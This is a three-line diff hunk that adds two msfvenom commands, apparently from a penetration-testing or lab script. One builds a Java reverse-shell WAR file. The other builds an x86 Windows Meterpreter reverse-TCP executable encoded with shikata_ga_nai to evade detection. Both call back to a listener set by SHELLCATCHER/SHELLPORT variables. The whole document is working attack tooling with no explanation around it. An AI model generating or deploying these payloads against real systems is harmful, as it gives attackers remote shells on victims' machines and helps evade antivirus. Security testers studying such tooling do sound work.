@@ -1,0 +1,3 @@
+msfvenom -p java/shell_reverse_tcp lhost=${SHELLCATCHER} lport=${SHELLPORT} -f war -o pwn.war
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=${SHELLCATCHER} LPORT=${SHELLPORT} -f exe -o windows/s.exe
